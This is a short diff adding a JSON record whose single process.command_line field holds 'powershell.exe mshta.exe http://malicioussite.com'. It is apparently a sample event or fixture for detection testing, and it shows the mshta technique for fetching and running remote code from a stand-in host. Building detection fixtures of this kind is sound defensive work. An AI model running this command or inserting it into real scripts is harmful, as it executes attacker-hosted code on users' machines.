@@ -1,0 +1,5 @@
+{
+  "process": {
+    "command_line": "powershell.exe mshta.exe http://malicioussite.com"
+  }
+}
